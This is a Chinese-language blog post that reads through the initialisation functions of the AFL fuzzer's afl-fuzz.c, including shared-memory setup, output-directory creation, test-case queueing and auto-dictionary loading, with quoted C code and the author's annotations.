<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Check ASAN options. */</span></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">check_asan_opts</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line">  u8* x = <span class="built_in">getenv</span>(<span class="string">&quot;ASAN_OPTIONS&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (x) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strstr</span>(x, <span class="string">&quot;abort_on_error=1&quot;</span>))</span><br><span class="line">      <span class="built_in">FATAL</span>(<span class="string">&quot;Custom ASAN_OPTIONS set without abort_on_error=1 - please fix!&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strstr</span>(x, <span class="string">&quot;symbolize=0&quot;</span>))</span><br><span class="line">      <span class="built_in">FATAL</span>(<span class="string">&quot;Custom ASAN_OPTIONS set without symbolize=0 - please fix!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  x = <span class="built_in">getenv</span>(<span class="string">&quot;MSAN_OPTIONS&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (x) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strstr</span>(x, <span class="string">&quot;exit_code=&quot;</span> <span class="built_in">STRINGIFY</span>(MSAN_ERROR)))</span><br><span class="line">      <span class="built_in">FATAL</span>(<span class="string">&quot;Custom MSAN_OPTIONS set without exit_code=&quot;</span></span><br><span class="line">            <span class="built_in">STRINGIFY</span>(MSAN_ERROR) <span class="string">&quot; - please fix!&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strstr</span>(x, <span class="string">&quot;symbolize=0&quot;</span>))</span><br><span class="line">      <span class="built_in">FATAL</span>(<span class="string">&quot;Custom MSAN_OPTIONS set without symbolize=0 - please fix!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<h4 id="fix-up-sync"><a href="#fix-up-sync" class="headerlink" title="fix_up_sync"></a>fix_up_sync</h4><ul>
<li><code>-S</code>指定了sync_id</li>
<li><code>-M</code> 指定了sync_id<ul>
<li>设置<code>sync_dir</code>的值为 -o的那个 <code>out_dir</code><ul>
<li><code>/home/wutang/Desktop/fuzz_test/fuzz_output</code></li>
</ul>
</li>
<li>设置<code>out_dir</code>的值为   -o的那个<code>out_dir/sync_id</code><ul>
<li><code>/home/wutang/Desktop/fuzz_test/fuzz_output/fuzzer1</code></li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="save-cmdline"><a href="#save-cmdline" class="headerlink" title="save_cmdline"></a>save_cmdline</h4><ul>
<li>拷贝字符串 orig_cmdline</li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">uint8_t</span> *orig_cmdline;  <span class="comment">/* Original command line            *</span></span><br><span class="line"><span class="comment">          </span></span><br><span class="line"><span class="comment">save_cmdline(argc, argv);</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">/* Make a copy of the current command line. */</span></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">save_cmdline</span><span class="params">(<span class="type">uint32_t</span> argc, <span class="type">char</span>** argv)</span> </span>&#123;</span><br><span class="line">  u32 len = <span class="number">1</span>, i;</span><br><span class="line">  <span class="type">uint8_t</span>* buf;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; argc; i++)</span><br><span class="line">    len += <span class="built_in">strlen</span>(argv[i]) + <span class="number">1</span>;</span><br><span class="line">  </span><br><span class="line">  buf = orig_cmdline = <span class="built_in">malloc</span>(len); <span class="comment">// ck_alloc</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; argc; i++) &#123;</span><br><span class="line">    u32 l = <span class="built_in">strlen</span>(argv[i]);</span><br><span class="line">    <span class="built_in">memcpy</span>(buf, argv[i], l);</span><br><span class="line">    buf += l;</span><br><span class="line">    <span class="keyword">if</span> (i != argc - <span class="number">1</span>) *(buf++) = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  *buf = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="fix-up-banner"><a href="#fix-up-banner" class="headerlink" title="fix_up_banner"></a>fix_up_banner</h4><ul>
<li>它的主要作用是在启动 AFL-Fuzz 时更新程序的 banner 信息，即程序运行时在终端上显示的版本信息和标题。它接受一个参数，即目标文件的路径，然后根据该文件的内容更新 banner 信息</li>
</ul>
<h4 id="check-if-tty"><a href="#check-if-tty" class="headerlink" title="check_if_tty"></a>check_if_tty</h4><ul>
<li>检查是否在tty终端上面运行。</li>
<li>启动 AFL-Fuzz 时更新程序的 banner 信息，即程序运行时在终端上显示的版本信息和标题</li>
<li>读取环境变量<code>AFL_NO_UI</code>的值，如果为真，则设置not_on_tty为1，并返回</li>
<li><code>ioctl(1, TIOCGWINSZ, &amp;ws)</code>通过ioctl来读取window size，如果报错为ENOTTY，则代表当前不在一个tty终端运行，设置not_on_tty</li>
</ul>
<h4 id="get-core-count"><a href="#get-core-count" class="headerlink" title="get_core_count"></a>get_core_count</h4><ul>
<li>计数logical CPU cores， 多少cpu cores&#x2F;正在使用多少<ul>
<li>&#96;&#96;c_linux_cpu</li>
</ul>
</li>
</ul>
<h4 id="bind-to-free-cpu"><a href="#bind-to-free-cpu" class="headerlink" title="bind_to_free_cpu"></a>bind_to_free_cpu</h4><ul>
<li>找到未被绑定到特定CPU核心的空闲CPU核心，然后将程序绑定到其中一个空闲核心上，以优化性能<ul>
<li>函数会尝试打开 <code>/proc</code> 目录，然后遍历其中的所有进程。目的是扫描所有进程的 <code>/proc/&lt;pid&gt;/status</code> 文件，检查进程是否绑定到特定的 CPU 核心。这样的检查通过读取进程的 <code>Cpus_allowed_list</code> 字段来实现</li>
</ul>
</li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">遍历进程</span><br><span class="line">cat /proc/<span class="number">8</span>/status</span><br><span class="line"></span><br><span class="line">读取 Cpus_allowed_list:	<span class="number">1</span> 有VmSize  那么cpu被占用</span><br><span class="line">否则空闲，读取他</span><br><span class="line"></span><br><span class="line">``c_linux_cpu_bind</span><br></pre></td></tr></table></figure>

<h4 id="check-crash-handling"><a href="#check-crash-handling" class="headerlink" title="check_crash_handling"></a>check_crash_handling</h4><ul>
<li>其主要目的是检查系统的崩溃处理设置，以确保在程序运行过程中产生的崩溃不会被外部崩溃报告工具处理，从而影响程序运行和崩溃处理的准确性。<ul>
<li>首先，代码在 Apple 系统中使用命令 <code>launchctl list</code> 检查是否启用了外部的崩溃报告工具（<code>.ReportCrash</code>）。如果启用了，说明系统将崩溃信息发送到外部报告工具，而不是直接让 fuzzer 通过标准的 <code>waitpid()</code> API 获取崩溃信息。在这种情况下，函数会输出警告信息，提示用户需要禁用该功能。</li>
</ul>
</li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">SL=/System/Library; PL=com.apple.ReportCrash</span><br><span class="line">launchctl unload -w $&#123;SL&#125;/LaunchAgents/$&#123;PL&#125;.plist</span><br><span class="line">sudo launchctl unload -w $&#123;SL&#125;/LaunchDaemons/$&#123;PL&#125;.Root.plist</span><br></pre></td></tr></table></figure>

<ul>
<li>如果不是 Apple 系统，则在 Linux 系统中，代码会读取 <code>/proc/sys/kernel/core_pattern</code> 文件，检查其中的核心转储模式设置。如果核心转储模式以 <code>|</code> 符号开头，说明系统将核心转储信息通过管道传递给了外部工具。这也会导致崩溃信息的延迟传递，从而影响 fuzzer 对崩溃的处理。在这种情况下，函数会输出警告信息，提示用户需要修改核心转储模式<ul>
<li>设置 <code>echo core &gt;/proc/sys/kernel/core_pattern</code></li>
</ul>
</li>
</ul>
<h4 id="check-cpu-governor"><a href="#check-cpu-governor" class="headerlink" title="check_cpu_governor"></a>check_cpu_governor</h4><ul>
<li>检查系统的 CPU 调频策略（CPU Scaling Governor）是否对 Fuzzing 运行有不良影响。Fuzzing 运行通常需要稳定的 CPU 运行频率以保证稳定的性能，而某些 CPU 调频策略可能会导致性能下降，从而影响 Fuzzing 运行的准确性和效率。</li>
<li>检查<code>AFL_SKIP_CPUFREQ</code> 不检查</li>
<li>首先，代码尝试打开文件 <code>/sys/devices/system/cpu/cpu0/cpufreq/scaling_governor</code>，读取系统当前的 CPU 调频策略。如果无法打开该文件，说明系统可能不支持 CPU 调频策略设置，或者文件路径不正确，那么函数直接返回。</li>
</ul>
<h4 id="setup-post"><a href="#setup-post" class="headerlink" title="setup_post"></a>setup_post</h4><ul>
<li>加载后处理器（post-processor）库，并检测后处理器是否成功加载和正常运行，任意语言包括go编译的so。在 Fuzzing 运行结束后，后处理器可以用于对 Fuzzing 的结果进行进一步的处理、分析或报告。<ul>
<li>Allows AFL_POST_LIBRARY postprocessors to be written in arbitrary languages that don’t have C &#x2F; .so bindings. Includes examples in Go.</li>
</ul>
</li>
<li>设置宏 <code>AFL_POST_LIBRARY=xxx.so</code><ul>
<li>里面包含 <code>afl_postprocess</code>  调用 <code>post_handler(&quot;hello&quot;, &amp;tlen);</code><ul>
<li>[[#u8 common_fuzz_stuff(char **argv, u8 *out_buf, u32 len)]]</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="setup-shm"><a href="#setup-shm" class="headerlink" title="setup_shm"></a>setup_shm</h4><ul>
<li>主要功能是配置共享内存和初始化 <code>virgin_bits</code> 数组。这些操作在程序启动时进行, 映射内存到本地<ul>
<li><a href="https://www.cnblogs.com/52php/p/5861372.html">Linux进程间通信（六）：共享内存 shmget()、shmat()、shmdt()、shmctl() - 52php - 博客园</a></li>
</ul>
</li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Get rid of shared memory (atexit handler). */</span></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">remove_shm</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">shmctl</span>(shm_id, IPC_RMID, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 该函数会在程序退出时被调用，用于删除之前创建的共享内存段</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Configure shared memory and virgin_bits. This is called at startup. */</span></span><br><span class="line"><span class="function">EXP_ST <span class="type">void</span> <span class="title">setup_shm</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line">  u8* shm_str;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!in_bitmap) <span class="built_in">memset</span>(virgin_bits, <span class="number">255</span>, MAP_SIZE);</span><br><span class="line">  <span class="built_in">memset</span>(virgin_tmout, <span class="number">255</span>, MAP_SIZE);</span><br><span class="line">  <span class="built_in">memset</span>(virgin_crash, <span class="number">255</span>, MAP_SIZE);</span><br><span class="line">  <span class="comment">// `virgin_tmout` 和 `virgin_crash` 数组也被初始化为 255。这两个数组分别用于跟踪超时和崩溃的情况。</span></span><br><span class="line"></span><br><span class="line">  shm_id = <span class="built_in">shmget</span>(IPC_PRIVATE, MAP_SIZE, IPC_CREAT | IPC_EXCL | <span class="number">0600</span>);</span><br><span class="line">  <span class="comment">// 1) `IPC_PRIVATE` 标志创建一个新的共享内存段</span></span><br><span class="line">  <span class="comment">// -   `IPC_CREAT`: 这个标志位表示如果共享内存段不存在，就创建一个新的。如果已经存在具有相同 `key` 的共享内存段，则返回该共享内存段的标识符。</span></span><br><span class="line">  <span class="comment">// -   `IPC_EXCL`: 这个标志位与 `IPC_CREAT` 一起使用时，表示只在共享内存段不存在的情况下创建。如果已经存在具有相同 `key` 的共享内存段，则 `shmget` 调用会失败。</span></span><br><span class="line">  <span class="comment">// -   `0600`: 这是一个八进制数，用于设置共享内存段的权限。在这个例子中，权限被设置为用户可读可写，没有执行权限</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (shm_id &lt; <span class="number">0</span>) <span class="built_in">PFATAL</span>(<span class="string">&quot;shmget() failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// /* Register a function to be called when `exit&#x27; is called.  */</span></span><br><span class="line">  <span class="built_in">atexit</span>(remove_shm);</span><br><span class="line">  </span><br><span class="line">  shm_str = <span class="built_in">alloc_printf</span>(<span class="string">&quot;%d&quot;</span>, shm_id);</span><br><span class="line">  <span class="comment">/* If somebody is asking us to fuzz instrumented binaries in dumb mode,</span></span><br><span class="line"><span class="comment">     we don&#x27;t want them to detect instrumentation, since we won&#x27;t be sending</span></span><br><span class="line"><span class="comment">     fork server commands. This should be replaced with better auto-detection</span></span><br><span class="line"><span class="comment">     later on, perhaps? */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!dumb_mode) <span class="built_in">setenv</span>(SHM_ENV_VAR, shm_str, <span class="number">1</span>);</span><br><span class="line">  <span class="comment">// 如果不是在 &quot;dumb mode&quot; 下运行（即非简化模式），则通过 `setenv` 函数将共享内存 ID 字符串存储到环境变量 `SHM_ENV_VAR` 中。这是为了在 fork server 模式下通知其他进程使用的共享内存。</span></span><br><span class="line">  <span class="built_in">ck_free</span>(shm_str);</span><br><span class="line">  trace_bits = <span class="built_in">shmat</span>(shm_id, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="comment">// 第一次创建完共享内存时，它还不能被任何进程访问，所以通过shmat来启动对该共享内存的访问，并把共享内存连接到当前进程的地址空间。</span></span><br><span class="line">  <span class="comment">// 调用 `shmat` 函数将共享内存段附加到当前进程的地址空间。如果附加失败，返回值为 `(void *)-1`，则会调用 `PFATAL` 函数终止程序运行。</span></span><br><span class="line">  <span class="comment">// 2) 通常为空，表示让系统来选择共享内存的地址</span></span><br><span class="line">  <span class="comment">// 3) shm_flg是一组标志位，通常为0</span></span><br><span class="line">  <span class="keyword">if</span> (trace_bits == (<span class="type">void</span> *)<span class="number">-1</span>) <span class="built_in">PFATAL</span>(<span class="string">&quot;shmat() failed&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="init-count-class16"><a href="#init-count-class16" class="headerlink" title="init_count_class16"></a>init_count_class16</h4><ul>
<li>定义了一个处理执行计数的函数和两个查找表，用于对执行计数进行分类。</li>
<li>这些查找表的主要目的是在进行后续的执行计数处理时，能够将执行计数转换为更具有统计意义的分类值，从而减少内存占用和计算成本。这在大规模的测试用例集中，对于执行计数的统计分析非常有用。</li>
<li>count_class_lookup8<ul>
<li>对于0，映射到分类值0。</li>
<li>对于1，映射到分类值1。</li>
<li>对于2，映射到分类值2。</li>
<li>对于3，映射到分类值4。</li>
<li>对于4到7，映射到分类值8。</li>
<li>对于8到15，映射到分类值16。</li>
<li>对于16到31，映射到分类值32。</li>
<li>对于32到127，映射到分类值64。</li>
<li>对于128到255，映射到分类值128。</li>
</ul>
</li>
<li>count_class_lookup16<ul>
<li>这是一个长度为65536的数组，用于将两个字节（16位）的执行计数组合成一个更粗粒度的分类值。它通过对每个字节在 count_class_lookup8 查找表中的分类值进行位运算来实现。</li>
</ul>
</li>
<li>这其实是因为<code>trace_bits</code>是用一个字节来记录是否到达这个路径，和这个路径被命中了多少次的，而这个次数在0-255之间，但比如一个循环，它循环5次和循环6次可能是完全一样的效果，为了避免被当成不同的路径，或者说尽可能减少因为命中次数导致的</li>
</ul>
<h4 id="setup-dirs-fds"><a href="#setup-dirs-fds" class="headerlink" title="setup_dirs_fds"></a>setup_dirs_fds</h4><ul>
<li>各种需要的路径创建</li>
</ul>
<h5 id="maybe-delete-out-dir"><a href="#maybe-delete-out-dir" class="headerlink" title="maybe_delete_out_dir"></a>maybe_delete_out_dir</h5><ul>
<li>这段代码主要用于管理和清理输出目录，以确保能够正常开始一个新的会话或者继续之前的会话。</li>
<li>读取<code>/home/wutang/Desktop/fuzz_test/fuzz_output/fuzzer1/fuzzer_stats</code></li>
<li>首先，代码检查输出目录是否被其他实例的 afl-fuzz 进程使用。如果目录被锁定，会给出相应的错误信息并终</li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> * out_dir;</span><br><span class="line"></span><br><span class="line">  out_dir_fd = <span class="built_in">open</span>(out_dir, O_RDONLY);</span><br><span class="line">  <span class="keyword">if</span> (out_dir_fd &lt; <span class="number">0</span>) <span class="built_in">PFATAL</span>(<span class="string">&quot;Unable to open &#x27;%s&#x27;&quot;</span>, out_dir);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> __sun <span class="comment">// 用于排除掉特定操作系统（例如 SunOS）的代码部分</span></span></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">flock</span>(out_dir_fd, LOCK_EX | LOCK_NB) &amp;&amp; errno == EWOULDBLOCK) &#123;</span><br><span class="line">    <span class="comment">// LOCK_EX 独占锁</span></span><br><span class="line">    <span class="comment">// LOCK_NB 非阻塞模式</span></span><br><span class="line">    <span class="comment">// 如果目录已被其他进程锁定且设置了非阻塞模式，那么此次加锁会失败，并且 `errno` 的值会被设置为 `EWOULDBLOCK`</span></span><br><span class="line">    <span class="built_in">SAYF</span>(<span class="string">&quot;\n&quot;</span> cLRD <span class="string">&quot;[-] &quot;</span> cRST</span><br><span class="line">         <span class="string">&quot;Looks like the job output directory is being actively used by another\n&quot;</span></span><br><span class="line">         <span class="string">&quot;    instance of afl-fuzz. You will need to choose a different %s\n&quot;</span></span><br><span class="line">         <span class="string">&quot;    or stop the other process first.\n&quot;</span>,</span><br><span class="line">         sync_id ? <span class="string">&quot;fuzzer ID&quot;</span> : <span class="string">&quot;output location&quot;</span>);</span><br><span class="line">    <span class="built_in">FATAL</span>(<span class="string">&quot;Directory &#x27;%s&#x27; is in use&quot;</span>, out_dir);</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* !__sun */</span></span></span><br></pre></td></tr></table></figure>

<ul>
<li>如果没设置<code>-i -</code>， <code>in_place_resume=0</code> &amp;&amp; 已经跑了 <code>last_update - start_time &gt; OUTPUT_GRACE * 60</code> 25分钟了<ul>
<li>退出不能继续跑</li>
</ul>
</li>
<li>如果设置 <code>-i -</code> ,<code>in_place_resume=1</code>输出  <code>Output directory exists, will attempt session resume.</code></li>
</ul>
<h5 id="函数主程序"><a href="#函数主程序" class="headerlink" title="函数主程序"></a>函数主程序</h5><ul>
<li>准备输出文件夹和fd<ul>
<li>如果<code>sync_id</code>存在，且创建<code>sync_dir</code>文件夹，设置权限为<code>0700</code>（读写执行）</li>
<li><code>/home/wutang/Desktop/fuzz_test/fuzz_output</code></li>
<li>如果报错，且errno不是EEXIST，则抛出异常。</li>
<li>创建<code>out_dir</code>，设置权限为0700（读写执行） <code>/home/wutang/Desktop/fuzz_test/fuzz_output/fuzzer1</code></li>
<li>创建失败<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">- 如果报错，且errno不是EEXIST，则抛出异常。</span><br><span class="line">- 是EEXIST 执行函数 [[#maybe_delete_out_dir]]</span><br></pre></td></tr></table></figure></li>
<li>如果创建成功<ul>
<li>如果设置 <code>-i -</code>, <code>in_place_resume=1</code> ， 就抛出异常 <strong>Resume attempted but old output directory not found</strong></li>
<li><code>out_dir_fd = open(out_dir, O_RDONLY)</code> 以只读模式打开这个文件，并返回文件句柄<code>out_dir_fd</code></li>
<li>如果没有定义宏<code>__sun</code></li>
<li>如果打开out_dir失败，或者为out_dir通过flock建立互斥锁定失败，就抛出异常<code>Unable to flock() output directory.</code></li>
</ul>
</li>
<li>建立queue文件夹 <code>/home/wutang/Desktop/fuzz_test/fuzz_output/fuzzer1/queue</code></li>
<li>创建<code>out_dir/queue</code>文件夹，设置权限为0700</li>
<li>创建<code>out_dir/queue/.state/</code>,设置权限为0700,该文件夹主要<strong>保存用于session resume和related tasks的queue metadata</strong></li>
<li>创建<code>out_dir/queue/.state/deterministic_done/</code>,设置权限为0700,该文件夹<strong>标记过去经历过deterministic fuzzing的queue entries</strong>。</li>
<li>创建<code>out_dir/queue/.state/auto_extras/</code>,设置权限为0700,<strong>Directory with the auto-selected dictionary entries.</strong></li>
<li>创建<code>out_dir/queue/.state/redundant_edges/</code>,设置权限为0700,<strong>保存当前被认为是多余的路径集合</strong></li>
<li>创建<code>out_dir/queue/.state/variable_behavior/</code>,设置权限为0700,<strong>The set of paths showing variable behavior.</strong></li>
<li>如果<code>sync_id</code>存在<ul>
<li>创建<code>out_dir/.synced/</code>,设置权限为0700, <strong>同步文件夹，用于跟踪cooperating fuzzers.</strong></li>
</ul>
</li>
<li>建立crashes文件夹<ul>
<li>创建<code>out_dir/crashes</code>文件夹，设置权限为0700,用于记录crashes</li>
</ul>
</li>
<li>建立hangs文件夹<ul>
<li>创建<code>out_dir/hangs</code>文件夹，设置权限为0700,用于记录hangs</li>
</ul>
</li>
<li>通常有用的文件描述符<ul>
<li><code>dev_null_fd = open(&quot;/dev/null&quot;, O_RDWR);</code>以读写模式打开<code>/dev/null</code></li>
<li><code>dev_urandom_fd = open(&quot;/dev/urandom&quot;, O_RDONLY);</code>,以只读模式打开<code>/dev/urandom</code></li>
</ul>
</li>
<li>建立Gnuplot输出文件夹<ul>
<li><code>fd = open(tmp, O_WRONLY | O_CREAT | O_EXCL, 0600);</code></li>
<li>以只写方式打开<code>out_dir/plot_data</code>文件，如果文件不存在，就创建，并获取句柄</li>
<li><code>plot_file = fdopen(fd, &quot;w&quot;);</code>根据句柄得到FILE* plot_file<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">- 使用 `fdopen()` 函数将文件描述符 `fd` 关联到一个文件流，以便后续进行文件操作。参数 &quot;w&quot; 表示以写入模式打开文件流。</span><br></pre></td></tr></table></figure></li>
<li>向其中写入<code># unix_time, cycles_done, cur_path, paths_total, pending_total, pending_favs, map_size, unique_crashes, unique_hangs, max_depth, execs_per_sec\n</code></li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="read-testcases"><a href="#read-testcases" class="headerlink" title="read_testcases"></a>read_testcases</h4><ul>
<li>从输入文件夹中读取所有文件，然后将它们排队进行测试。<ul>
<li>尝试访问<code>in_dir/queue</code>文件夹，如果存在就重新设置<code>in_dir</code>为<code>in_dir/queue</code><ul>
<li>Auto-detect non-in-place resumption attempts.</li>
</ul>
</li>
<li><code>scandir</code>扫描in_dir，并将结果保存在<code>struct dirent **nl</code>里<ul>
<li>不使用readdir,因为测试用例的顺序将随机地有些变化,并且将难以控制。</li>
</ul>
</li>
<li>如果设置宏<code>AFL_SHUFFLE_QUEUE</code>, <code>shuffle_queue</code>的值为真，且nl_cnt大于1<ul>
<li>则<code>shuffle_ptrs((void **) nl, nl_cnt)</code>，字面意思上就是重排nl里的指针的位置。<strong>随机化</strong></li>
</ul>
</li>
<li>遍历<code>nl,nl[i]-&gt;d_name</code>的值为input文件夹下的文件名字符串<ul>
<li><code>u8 *fn = alloc_printf(&quot;%s/%s&quot;, in_dir, nl[i]-&gt;d_name);</code></li>
<li><code>u8 *dfn = alloc_printf(&quot;%s/.state/deterministic_done/%s&quot;, in_dir, nl[i]-&gt;d_name);</code></li>
<li>通过<code>lstat(fn, &amp;st) &amp;&amp; !S_ISREG(st.st_mode)</code>, 文件属性过滤掉<code>.</code>和<code>..</code>这样的regular文件，并检查文件大小，如果文件大小大于MAX_FILE，默认是<code>1024*1024</code>字节，即<strong>1M</strong></li>
<li><code>find . -type f -size +1M</code></li>
<li>通过access检查<code>in_dir/.state/deterministic_done/nl[i]-&gt;d_name</code>是否存在，这应该是为了用在resume恢复扫描使用</li>
<li>如果存在就设置<code>passed_det</code>为1</li>
<li>这个检查是用来判断是否这个entry已完成<code>deterministic fuzzing</code>。在恢复异常终止的扫描时，我们不想重复<code>deterministic fuzzing</code>，因为这将毫无意义，而且可能非常耗时</li>
<li><code>add_to_queue(fn, st.st_size, passed_det);</code></li>
<li>[[#add_to_queue(u8 *fname, u32 len, u8 passed_det)]]</li>
<li>如果<code>queued_paths</code>为0，则代表输入文件夹为0，抛出异常</li>
<li>设置 <code>last_path_time</code> 为0</li>
<li><code>queued_at_start</code>的值设置为queued_paths<ul>
<li>Total number of initial inputs</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="add-to-queue-u8-fname-u32-len-u8-passed-det"><a href="#add-to-queue-u8-fname-u32-len-u8-passed-det" class="headerlink" title="add_to_queue(u8 *fname, u32 len, u8 passed_det)"></a>add_to_queue(u8 *fname, u32 len, u8 passed_det)</h4><ul>
<li>将新的测试用例添加到队列中，以供后续进行测试。<ul>
<li>形成一个链表 <code>queue_top</code></li>
<li>会添加测试用例 然后 <code>queued_paths++</code></li>
</ul>
</li>
<li><code>queue_entry</code>是一个链表数据结构</li>
<li>先通过calloc动态分配一个<code>queue_entry</code>结构体，并 <strong>初始化其fname为文件名fn，len为文件大小，depth为cur_depth + 1, passed_det为传递进来的 passed_det</strong></li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">q-&gt;fname = fname;  </span><br><span class="line">q-&gt;len = len;  </span><br><span class="line">q-&gt;depth = cur_depth + <span class="number">1</span>;  </span><br><span class="line">q-&gt;passed_det = passed_det;  </span><br></pre></td></tr></table></figure>

<ul>
<li>如果<code>q-&gt;depth &gt; max_depth</code>，则设置<code>max_depth为q-&gt;depth</code></li>
<li>如果queue_top不为空，则设置<code>queue_top-&gt;next为q，queue_top = q;</code>，否则<code>q_prev100 = queue = queue_top = q;</code></li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">struct</span> <span class="title class_">queue_entry</span> *queue, <span class="comment">/* Fuzzing queue (linked list)*/</span>  </span><br><span class="line">*queue_top, <span class="comment">/* Top of the list            */</span>  </span><br><span class="line">*q_prev100; <span class="comment">/* Previous 100 marker        */</span>  </span><br></pre></td></tr></table></figure>

<ul>
<li>queue计数器 queued_paths 和待fuzz的样例计数器 <code>pending_not_fuzzed</code> 加一</li>
<li>cycles_wo_finds 设置为0<ul>
<li><code>Cycles without any new paths</code></li>
</ul>
</li>
<li>如果<code>queued_paths % 100</code>得到0，则设置<code>q_prev100-&gt;next_100 = q; q_prev100 = q;</code></li>
<li>设置 <code>last_path_time</code> 为当前时间。</li>
</ul>
<h4 id="load-auto"><a href="#load-auto" class="headerlink" title="load_auto"></a>load_auto</h4><ul>
<li>load自动生成的提取出来的词典token<ul>
<li>遍历循环从i等于0到 <code>USE_AUTO_EXTRAS</code>，默认<code>50</code></li>
<li>以只读模式尝试打开文件名为<code>alloc_printf(&quot;%s/.state/auto_extras/auto_%06u&quot;, in_dir, i)</code>的文件<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">- `/home/wutang/Desktop/fuzz_test/fuzz_input/.state/auto_extras/auto_000000`</span><br></pre></td></tr></table></figure></li>
<li>如果打开失败，则结束</li>
<li>如果打开成功，则从fd读取最多<code>MAX_AUTO_EXTRA+1=32+1</code>个字节到tmp数组里，这是单个auto extra文件的最大大小，读取出的长度保存到len里。<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-   `3&lt;= len &lt;= 32` 会 `maybe_add_auto(tmp,  );`   [[#maybe_add_auto(u8 *mem, u32 len)]]</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<h4 id="maybe-add-auto-u8-mem-u32-len"><a href="#maybe-add-auto-u8-mem-u32-len" class="headerlink" title="maybe_add_auto(u8 *mem, u32 len)"></a>maybe_add_auto(u8 *mem, u32 len)</h4><ul>
<li>如果用户设置了 <code>MAX_AUTO_EXTRAS</code> 或者 <code>USE_AUTO_EXTRAS</code> 为0，则直接返回。</li>
<li><strong>如果不允许自动生成字典项，则直接返回</strong></li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Allow users to specify that they don&#x27;t want auto dictionaries. */</span></span><br><span class="line"><span class="keyword">if</span> (!MAX_AUTO_EXTRAS || !USE_AUTO_EXTRAS) <span class="keyword">return</span>;</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>跳过连续相同的字节</strong><ul>
<li>循环遍历i从1到len，将<code>tmp[0]</code>和<code>tmp[i]</code>异或，如果相同，则结束循环。</li>
<li>如果结束时<code>i=0</code>，即<code>tmp[0]</code>和<code>tmp[1]</code>就相同，就直接返回。这里我推断tmp应该是从小到大排序的字节流。</li>
</ul>
</li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Skip runs of identical bytes. */</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; len; i++)</span><br><span class="line">  <span class="keyword">if</span> (mem[<span class="number">0</span>] ^ mem[i]) <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>根据长度，检查字节序列是否与内置的有趣值相匹配，如果匹配则跳过</strong><ul>
<li>如果len的长度为2，就和interesting_16数组里的元素比较，如果和其中某一个相同，就直接return</li>
<li>如果len的长度为4，就和interesting_32数组里的元素比较，如果和其中某一个相同，就直接return</li>
</ul>
</li>
</ul>
